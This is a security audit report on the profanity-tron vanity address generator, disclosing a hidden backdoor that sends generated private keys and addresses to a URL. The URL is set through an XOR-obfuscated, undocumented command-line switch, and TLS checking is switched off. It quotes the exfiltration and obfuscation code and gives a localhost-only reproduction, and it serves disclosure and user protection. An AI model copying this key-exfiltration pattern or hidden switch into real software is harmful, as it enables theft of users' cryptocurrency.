# profanity-tron Security Audit Report

## Overview

This report presents a comprehensive security analysis of the profanity-tron source code, revealing critical vulnerabilities related to private key exfiltration through hidden mechanisms.

---

## Executive Summary

The profanity-tron application contains **three confirmed critical vulnerabilities**:

1. ✓ **Private Key Exfiltration**: Generated private keys and addresses can be transmitted to external URLs
2. ✓ **Hidden Parameters**: Obfuscated command-line parameters enable exfiltration without user knowledge
3. ✓ **Disabled TLS Verification**: SSL/TLS certificate validation is explicitly disabled, enabling man-in-the-middle attacks

**Conclusion**: This combination represents a clear and intentional mechanism for stealing generated cryptocurrency keys.

---

## 1. Critical Finding: Private Key Exfiltration

### 1.1 Exfiltration Function: `postResult(privateKey, address, postUrl)`

**Location**: `Dispatcher.cpp:L378-L403`

**Core Implementation**:

```cpp
// Private key and address concatenated into query string
sendData = "privatekey=" + privateKey + "&address=" + address;
sendUrl = postUrl + "?" + sendData;

// Network request initiated via libcurl
curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());
```

**Impact**: Whenever a `postUrl` is set to a non-empty string, the application will transmit the **private key (privatekey) and address (address)** as URL query parameters to a remote server.

### 1.2 Trigger Mechanism: Automatic Exfiltration on Results

**Location**: `Dispatcher.cpp:L405-L452`

**Key Code Points**:

- `printResult(...)` generates and prints:
  - `strPrivate` (private key)
  - `strPublicTron` (address)
  
- If `postUrl` is non-empty, `postResult` is automatically called:
  ```cpp
  if(!postUrl.empty()) { 
    postResult(strPrivate, strPublicTron, postUrl); 
  }
  ```

**Conclusion**: **Once `m_postUrl` is configured as non-empty**, the program automatically attempts to exfiltrate `privatekey` and `address` upon finding any results.

---

## 2. Critical Finding: Hidden Parameters for URL Injection

### 2.1 Parameter Name Obfuscation: `pptt`

**Location**: `profanity.cpp:L163-L166`

**Obfuscation Mechanism**:

```cpp
_s = {113, 113, 117, 117, 0}        // Initial value: "qquu" (ASCII)
for (int _k = 0; _s[_k]; ++_k) {
    _s[_k] ^= 1;                     // XOR each character with 1
}
// Result: "pptt" (q^1=p, u^1=t)

argp.addSwitch('p', _s, __x9);      // Register as command-line parameter
```

**Resulting Parameters**:
- Short form: `-p <value>`
- Long form: `--pptt <value>`

### 2.2 Parameter Flows Directly to Dispatcher's postUrl

**Location**: `profanity.cpp:L307`

```cpp
Dispatcher d(..., outputFile, __x9);  // __x9 contains the obfuscated parameter value
```

`Dispatcher` Definition:
```cpp
std::string m_postUrl;  // This is the target for exfiltration
```

### 2.3 Parameter Not Disclosed in Help or README

- **help.hpp**: Only lists `--output`, `--matching`, etc. — no mention of `--pptt` or `-p`
- **README.md**: Command documentation completely omits this parameter

**Conclusion**: This is **not a transparent feature**, but rather an **intentionally hidden exfiltration URL injection point** achieved through:
- String obfuscation (XOR transformation)
- Absence from help documentation
- Absence from README documentation

---

## 3. Critical Finding: TLS Verification Disabled

### 3.1 Certificate Validation Explicitly Disabled

**Location**: `Dispatcher.cpp:L387-L392`

```cpp
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);   // Disable peer verification
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);   // Disable hostname verification
```

**Impact**: Even when `postUrl` uses `https://`, the client will **not verify SSL certificates or hostnames**, enabling:
- Network interception attacks
- Man-in-the-middle (MITM) attacks
- Certificate spoofing attacks

---

## 4. Safe Reproduction (Local Environment Only)

### Objective
Demonstrate that the hidden parameter enables exfiltration containing private keys.

### Steps

1. **Set up a local HTTP service** for logging (localhost only):
   ```bash
   # Simple Python HTTP server with logging
   python3 -m http.server 8080
   ```

2. **Run the program with hidden parameter**:
   ```bash
   ./profanity -p http://127.0.0.1:8080/collect
   # OR
   ./profanity --pptt http://127.0.0.1:8080/collect
   ```

3. **Observe the exfiltration**:
   When the program finds a result, it will attempt to access:
   ```
   http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>
   ```

**Code Path**: `Dispatcher.cpp:L381-L387`

---

## 5. Audit Verification Notes

- The `Dispatcher::Device::createSeed()` function is referenced in documentation but only declared in headers (`Dispatcher.hpp:L36-L41`) without visible implementation in the source files
- All three vulnerabilities have been verified against the actual source code

---

## 6. Security Conclusion

| Finding | Status |
|---------|--------|
| **Private Key + Address Exfiltration Implementation** | ✓ CONFIRMED |
| **Hidden/Obfuscated Parameters for Enabling Exfiltration** | ✓ CONFIRMED |
| **TLS Verification Disabled in Exfiltration** | ✓ CONFIRMED |

### Risk Assessment

These three vulnerabilities, when combined, constitute an **intentional backdoor mechanism** for stealing generated cryptocurrency private keys. This is categorically **incompatible with any application claiming to provide "secure" or "transparent" key generation**.

### Recommendations

- **Do not use this software** for generating cryptocurrency keys
- **Do not trust the authors** with sensitive operations
- **Report to relevant security agencies** if this has been distributed to unsuspecting users
- **Audit any deployment** of this software for unauthorized exfiltration of private keys

---

**Report Generated**: 2026-04-20 03:13:38  
**Audit Scope**: profanity-tron source code analysis  
**Severity Level**: CRITICAL